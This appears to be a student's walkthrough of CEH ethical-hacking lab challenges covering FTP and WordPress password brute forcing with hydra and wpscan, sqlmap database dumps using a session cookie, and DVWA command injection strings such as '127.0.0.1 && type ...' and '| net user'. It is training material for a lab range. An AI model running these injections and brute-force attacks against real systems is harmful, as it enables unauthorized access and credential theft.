**CEH Engage Part 3**

Part 3 of CEH Skill Check covers Session Hijacking, Evading IDS, Firewalls, and Honeypots, Hacking Web Servers, Hacking Web Applications, and SQL Injection modules. In this part, you must take over active network and application sessions, compromise firewall, IDS, and other perimeter defense mechanisms, and exploit the organization’s web applications. You need to note all the information discovered in this part of the Skill Check and proceed to the subsequent phases of the ethical hacking cycle in the next part of the Skill Check.

Flags

**Challenge 1:**

CEHORG suspects of a possible session hijacking attack on a machine in its network. The organisation has retained the network traffic data for the session at C:\Users\Admin\Documents in the EH Workstation – 2 as sniffsession.pcap. You have been assigned a task to perform an analysis and find out the protocol that has been used for sniffing on its network. (Format: AAA)

#Module 11 Session Hijacking - Lab2 - Wireshark#
![Screenshot 2024-12-12 at 11 49 56 AM](https://github.com/user-attachments/assets/d1210604-f1dc-4e0d-b089-729266bfc0a6)

**Challenge 2:**

Perform an HTTP-recon on www.certifiedhacker.com and find out the version of Nginx used by the web server. (Format: N.NN.N)

#Module 13 Hacking Web Servers - Lab1 - httprecon#
![Screenshot 2024-12-12 at 11 53 33 AM](https://github.com/user-attachments/assets/91dc1966-6db4-4f68-a38b-b722a7b749c8)


**Challenge 3:**

An FTP site is hosted on a machine in the CEHORG network. Crack the FTP credentials, obtain the “flag.txt” file and determine the content in the file. (Format: Aaaaaaa*AAA)

#Module 13 Hacking Web Servers - Lab2 - Hydra#

```
nmap -p 21 172.16.0.0/24

nmap -p 21 10.10.10.0/24

nmap -p 21 192.168.0.0/24
```

```
hydra -L <username.txt> -P <password.txt> ftp://172.16.0.12
```
![Screenshot 2024-12-12 at 12 08 57 PM](https://github.com/user-attachments/assets/cdab6979-a6b1-4ec8-863e-314000aa648b)

![Screenshot 2024-12-12 at 12 11 40 PM](https://github.com/user-attachments/assets/98e5919d-cd2a-4632-a20e-17075b4f6b14)

**Challenge 4:**

Perform Banner grabbing on the web application movies.cehorg.com and find out the ETag of the respective target machine. (Format: "NaNNNNNaaaNaaNN*N")

#Module 14 Hacking Web Applications - Lab1 - telnet#

```
telnet movies.cehorg.com 80
```
![Screenshot 2024-12-12 at 12 23 44 PM](https://github.com/user-attachments/assets/52183f4e-c8eb-447b-ba62-cdd385f3fd97)


**Challenge 5:**

Identify the Content Management System used by www.cehorg.com. (Format: AaaaAaaaa)

#Module 14 Hacking Web Applications - Lab1 - whatweb#

```
whatweb www.cehorg.com -v
```
![Screenshot 2024-12-12 at 2 49 33 PM](https://github.com/user-attachments/assets/b8dd8ae6-6773-4b62-a861-adf297c3056e)

**Challenge 6:**

Perform web application reconnaissance on movies.cehorg.com and find out the HTTP server used by the web application. (Format: Aaaaaaaaa-AAA/NN.N)

#Module 14 Hacking Web Applications - Lab1 - whatweb#

```
whatweb movies.cehorg.com -v
```
![Screenshot 2024-12-12 at 2 52 07 PM](https://github.com/user-attachments/assets/a7ea1d8a-b634-4cae-a2f1-2eb3c6282fc1)

**Challenge 7:**

Perform Web Crawling on the web application movies.cehorg.com and identify the number of live png files in images folder. (Format: N)

#Module 14 Hacking Web Applications - Lab1 - OWASP ZAP#

![Screenshot 2024-12-12 at 2 59 23 PM](https://github.com/user-attachments/assets/2c3a4375-fa10-4a52-8673-082863b51583)

**Challenge 8:**

Identify the load balancing service used by eccouncil.org. (Format: aaaaaaaaaa)

#Module 14 Hacking Web Applications - Lab1 - lbd command#
![Screenshot 2024-12-12 at 3 04 58 PM](https://github.com/user-attachments/assets/eb0e3f9d-4858-4e17-9eb0-03e0914d6445)


**Challenge 9:**

Perform a bruteforce attack on www.cehorg.com and find the password of user adam. (Format: aaaaaaNNNN)

#Module 14 Hacking Web Applications - Lab2 - wpscan#
```
wpscan --url http://cehorg.com/wp-login.php -U ./Usernames.txt -P ./Passwords.txt
```
![Screenshot 2024-12-12 at 4 14 02 PM](https://github.com/user-attachments/assets/89170933-70c0-4c81-950c-70deeffa24be)


**Challenge 10:**

Perform parameter tampering on movies.cehorg.com and find out the user for id 1003. (Format: Aaaaa)

#Module 14 Hacking Web Applications - Lab2 - XSS Vuberability#
![Screenshot 2024-12-12 at 3 19 27 PM](https://github.com/user-attachments/assets/37b7e592-3b46-40b6-910b-04c23303e353)


**Challenge 11:**

Perform a SQL Injection attack on movies.cehorg.com and find out the number of users available in the database. Use Jason/welcome as login credentials. (Format: N)

#Module 15 SQL Injection - Lab1 -sqlmap#

```
document.cookie
```
![Screenshot 2024-12-12 at 3 31 53 PM](https://github.com/user-attachments/assets/84fb2749-dbd7-4c51-8329-e30a63b8a00b)

```
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step 8]" --dbs

```
![Screenshot 2024-12-12 at 3 42 09 PM](https://github.com/user-attachments/assets/88d0eba5-9d66-4657-9991-87a8e06dd2aa)

```
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope --tables
```
![Screenshot 2024-12-12 at 3 42 45 PM](https://github.com/user-attachments/assets/16e09ee5-282b-4d60-bb93-a17e1919943b)

```
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step 8]" -D moviescope -T User_Login --dump

```
![Screenshot 2024-12-12 at 3 43 38 PM](https://github.com/user-attachments/assets/084f945a-f7ce-480c-8f49-8a5f986ff0e6)

**Challenge 12:**

Perform XSS vulnerability test on www.cehorg.com and identify whether the application is vulnerable to attack or not. (Yes/No). (Format: Aa)

#Module 14 Hacking Web Applications - Lab1 - OWASP ZAP#
![Screenshot 2024-12-12 at 4 16 43 PM](https://github.com/user-attachments/assets/13fcd029-9dc9-48b0-98f4-7a8f9347f3c2)

**Challenge 13:**

A file named Hash.txt has been uploaded through DVWA (http://10.10.10.25:8080/DVWA). The file is located in the directory mentioned below. Access the file and crack the MD5 hash to reveal the original message; enter the content after cracking the hash. You can log into the DVWA using the following credentials. Note: Username- admin; Password- password Path: C:\wamp64\www\DVWA\hackable\uploads\Hash.txt Hint: Use “type” command to view the file. Use the following link to decrypt the hash- https://hashes.com/en/decrypt/hash (Format: Aa*aaNa)

#Module 14 Hacking Web Applications - Lab2 -DVWA#

```
127.0.0.1 && type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
```
![Screenshot 2024-12-12 at 4 29 20 PM](https://github.com/user-attachments/assets/8fda9f90-2733-4b15-87f6-ca012900ab96)
![Screenshot 2024-12-12 at 4 30 07 PM](https://github.com/user-attachments/assets/a9ca24db-1833-4bf0-b245-3e41d5681bfe)


**Challenge 14:**

Perform command injection attack on 10.10.10.25 and find out how many user accounts are registered with the machine. Note: Exclude admin/Guest user (Format: N)

#Module 14 Hacking Web Applications - Lab2 -DVWA#

```
| net user
```

**Challenge 15:**

You have identified a vulnerable web application on a Linux server at port 8080. Exploit the web application vulnerability, gain access to the server and enter the content of RootFlag.txt as the answer. (Format: Aa*aaNNNN)
